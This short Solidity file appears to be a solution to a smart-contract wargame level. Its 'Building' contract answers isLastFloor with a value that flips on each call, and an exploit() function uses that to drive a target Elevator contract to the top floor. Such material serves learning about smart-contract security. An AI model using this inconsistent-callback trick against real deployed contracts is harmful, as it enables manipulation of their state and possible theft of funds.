// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ElevatorInterface {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool public isTop = true;
    ElevatorInterface elevator;

    function isLastFloor(uint256) external returns (bool) {
        isTop = !isTop;

        return isTop;
    }

    function exploit(address _addr) public {
        elevator = ElevatorInterface(_addr);
        elevator.goTo(10);
    }
}
